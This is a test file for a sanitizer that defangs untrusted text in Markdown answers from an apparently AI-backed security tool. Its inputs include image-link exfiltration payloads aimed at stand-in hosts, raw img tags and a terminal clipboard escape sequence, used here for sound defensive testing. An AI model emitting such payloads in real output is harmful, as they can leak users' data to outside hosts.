"""Markdown is a display that fetches images and makes links clickable (B.3 §3.11).

Every payload in the corpus's `markdown` group, put through each exit (`md_code`,
`md_block`, `for_markdown`) and through the whole answer renderer, must come out with no
image, no clickable link and no raw HTML -- checked by rendering the result with a real
CommonMark+GFM renderer (markdown-it-py, as Open WebUI's marked would) and inspecting the
HTML, not by string matching our own output.
"""
from __future__ import annotations

import re

import pytest
from _untrusted_corpus import CORPUS

from kratos import untrusted
from kratos.serve import render

MD_CASES = {k: v for k, v in CORPUS.items() if k.startswith("md_")}

md = pytest.importorskip("markdown_it")


def _html(text: str) -> str:
    renderer = md.MarkdownIt("commonmark", {"html": True, "linkify": True}).enable(["table", "strikethrough", "linkify"])
    return renderer.render(text)


def _assert_inert(text: str, *, link_hosts: tuple[str, ...] = ()) -> None:
    html = _html(text)
    assert "<img" not in html.lower(), html
    for tag in re.findall(r"<([a-zA-Z][^>]*)>", html):        # real tags only, not escaped text
        assert not re.search(r"\b(src|srcset|style|on[a-z]+)\s*=", tag, re.I), (tag, html)
    for href in re.findall(r"<a\s[^>]*href\s*=\s*[\"']?([^\"'\s>]*)", html, re.I):
        host = re.sub(r"^[a-z]+://", "", href).split("/")[0].split(":")[0].lower()
        assert host in link_hosts, (href, html)
    # raw HTML from the payload never becomes a tag: every tag in the output is one the
    # Markdown renderer made for formatting
    for tag in re.findall(r"<\s*([a-zA-Z][a-zA-Z0-9-]*)", html):
        assert tag.lower() in {"p", "code", "pre", "em", "strong", "ul", "ol", "li", "h1", "h2", "h3", "h4", "h5",
                               "h6", "blockquote", "hr", "br", "table", "thead", "tbody", "tr", "th", "td", "a",
                               "del", "s"}, (tag, html)


def test_corpus_has_markdown_cases():
    assert len(MD_CASES) >= 10


@pytest.mark.parametrize("name", sorted(MD_CASES))
def test_prose_exit_is_inert(name):
    _assert_inert(untrusted.for_markdown(MD_CASES[name]))


@pytest.mark.parametrize("name", sorted(CORPUS))
def test_every_corpus_payload_is_inert_and_screen_safe(name):
    from _untrusted_corpus import assert_screen_safe

    for out in (untrusted.for_markdown(CORPUS[name]), untrusted.md_code(CORPUS[name]), untrusted.md_block(CORPUS[name])):
        _assert_inert(out)
        assert_screen_safe(out, where=name)


@pytest.mark.parametrize("name", sorted(MD_CASES))
def test_code_exits_are_inert(name):
    payload = MD_CASES[name]
    _assert_inert(untrusted.md_code(payload))
    _assert_inert(untrusted.md_block(payload))


@pytest.mark.parametrize("name", sorted(MD_CASES))
def test_whole_answer_is_inert_in_every_part(name):
    payload = MD_CASES[name]
    block = f"Kratos found (open, serious):\n  - HIGH PERSIST-001 cron line {payload}\n\n"
    notes = f"[NOTE: this answer mentions {payload}.]\n\n"
    analysis = f"The entry {payload} looks planted."
    final = block + notes + analysis
    cmds = [{"command": f"crontab -l | grep {payload}", "explanation": payload, "source": "model",
             "run_on": "target", "flags": [{"id": "pipe_to_shell", "reason": payload}]},
            {"command": "systemctl enable --now fail2ban", "explanation": payload, "source": "template",
             "template": f"service.enable {payload}", "run_on": "target", "flags": []}]
    out = render.answer_markdown(final, {"block": block, "notes": notes, "analysis": analysis}, cmds)
    _assert_inert(out)
    # and when the parts are missing, the whole answer as prose
    _assert_inert(render.answer_markdown(final, None, cmds))


def test_md_code_keeps_text_verbatim():
    assert untrusted.md_code("a `b` c") == "`` a `b` c ``"
    assert _html(untrusted.md_code("![x](http://e.test/q)")).count("<code>") == 1


def test_md_block_fence_cannot_be_closed_from_inside():
    text = "x\n```\n![x](http://e.test/a)\n````\n<img src=x>"
    out = untrusted.md_block(text)
    assert out.startswith("`````") and out.endswith("`````")
    _assert_inert(out)


def test_links_to_allowed_hosts_stay_clickable():
    out = untrusted.for_markdown("see [the advisory](https://ubuntu.com/security/CVE-2024-1)",
                                 link_hosts=("ubuntu.com",))
    assert 'href="https://ubuntu.com/security/CVE-2024-1"' in _html(out)
    _assert_inert(out, link_hosts=("ubuntu.com",))


def test_other_links_are_shown_defanged_with_the_address_visible():
    out = untrusted.for_markdown("see [the advisory](https://evil.example/x?q=secret)")
    html = _html(out)
    assert "<a " not in html
    assert "evil" in html and "example" in html and "q=secret" in html


def test_formatting_survives():
    out = untrusted.for_markdown("**Summary**\n\n- one\n- two\n\n```sh\nls -la /tmp\n```")
    html = _html(out)
    assert "<strong>Summary</strong>" in html and "<li>one</li>" in html and "ls -la /tmp" in html


def test_model_code_block_is_refenced_so_text_after_it_is_still_cleaned():
    # a backtick run inside the block must not let the renderer think the block ended later
    text = "```\na ```` b\n```\n![leak](http://e.test/?q=1)"
    _assert_inert(untrusted.for_markdown(text))


def test_unclosed_fence_is_closed():
    out = untrusted.for_markdown("```\n![x](http://e.test/)")
    _assert_inert(out)
    assert out.rstrip().endswith("```")


def test_control_and_hidden_characters_are_cleaned_first():
    out = untrusted.for_markdown("ok\x1b]52;c;ZXZpbA==\x07 ‮done")
    assert "\x1b" not in out and "‮" not in out


@pytest.mark.parametrize("name", sorted(CORPUS))
def test_prose_never_carries_latex_delimiters_open_webui_would_eat(name):
    """Open WebUI renders \\[ ... \\] and \\( ... \\) as LaTeX: an escape built from them
    garbles the text (seen live). The prose exit uses plain-bracket defanging instead."""
    out = untrusted.for_markdown(CORPUS[name] + " see https://attacker.example/x and admin@attacker.example")
    outside_code = re.sub(r"(`+)[^`]*?\\1", "", out)
    for seq in ("\\[", "\\]", "\\(", "\\)"):
        assert seq not in outside_code, (seq, out)


def test_defanged_address_stays_readable():
    assert untrusted.for_markdown("go to https://evil.example/a?b=1") == "go to hxxps[:]//evil[.]example/a?b=1"
